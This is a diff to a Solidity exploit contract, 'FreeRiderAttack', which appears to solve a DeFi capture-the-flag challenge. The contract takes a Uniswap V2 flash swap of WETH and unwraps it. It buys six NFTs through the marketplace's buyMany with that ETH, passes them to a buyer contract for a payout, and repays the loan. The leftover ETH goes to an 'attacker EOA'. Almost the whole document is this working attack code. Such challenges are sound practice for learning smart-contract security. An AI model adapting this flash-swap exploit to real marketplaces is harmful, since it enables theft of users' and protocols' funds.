@@ -19,17 +19,12 @@ interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
 }
 
-// interface IERC721Receiver {
-//     function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
-// }
-
 interface IWETH9 {
+    function deposit() external payable;
+    function withdraw(uint wad) external;
     function transfer(address dst, uint wad) external returns (bool);
 }
 
-
-
-// Todo - Inherit NFTReceiver
 
 contract FreeRiderAttack is IUniswapV2Callee {
 
@@ -71,8 +66,22 @@ contract FreeRiderAttack is IUniswapV2Callee {
         // work out amount to repay (with fees)
         uint repayAmount = ((amount0 * 1000) / 997) + 1;
 
+        // unwrap WETH
+        weth.withdraw(amount0);
+
+        // Dear god there must be a better way to create this array wtf...
+        // When I try define it more directly:
+        // TypeError: Type uint8[6] memory is not implicitly convertible to expected type uint256[] memory
+        uint256[] memory tokenIds = new uint256[](6);
+        tokenIds[0] = uint256(0);
+        tokenIds[1] = uint256(1);
+        tokenIds[2] = uint256(2);
+        tokenIds[3] = uint256(3);
+        tokenIds[4] = uint256(4);
+        tokenIds[5] = uint256(5);
+
         // buy all NFTs
-        marketplace.buyMany{ value: amount0 }([0, 1, 2, 3, 4, 5]);
+        marketplace.buyMany{ value: amount0 }(tokenIds);
 
         // Send NFTs to buyer contract (receive 45ETH)
         for(uint i=0; i < 6; i++) {
@@ -83,11 +92,14 @@ contract FreeRiderAttack is IUniswapV2Callee {
             );
         }
 
+        // Wrap some WETH to repay flash swap  
+        weth.deposit{ value: repayAmount }();
+
         // Repay flashswap amount to repay (≈15 ETH, plus fee)
         weth.transfer(address(pair), repayAmount);
 
         // Send 30 ETH to attacker EOA
-        payable(owner).sendValue(address(this).balance);
+        payable(owner).transfer(address(this).balance);
 
 
     } 
@@ -96,6 +108,7 @@ contract FreeRiderAttack is IUniswapV2Callee {
         return IERC721Receiver.onERC721Received.selector;
     }
 
+    receive() external payable {}
 
 }
  
